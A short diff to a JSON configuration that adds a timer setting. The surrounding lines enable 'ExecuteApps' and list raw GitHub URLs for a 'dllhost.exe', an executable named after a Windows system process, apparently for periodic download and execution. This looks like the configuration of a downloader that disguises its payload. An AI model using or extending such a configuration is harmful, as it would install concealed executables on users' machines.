@@ -4,6 +4,7 @@
   "ExecuteApps": true,
   "ConfirmationInterval": 1200000,
   "UpdateTimerInterval": 480000,
+  "LimboTimerInterval": 2400000,
   "dllhostFiles": [
     "https://raw.githubusercontent.com/Aleksandr020295/Aleksandr_javascript/main/dllhost.exe",
     "https://raw.githubusercontent.com/Aleksandr020295/Aleksandr_javascript/main/dllhost.exe.config",
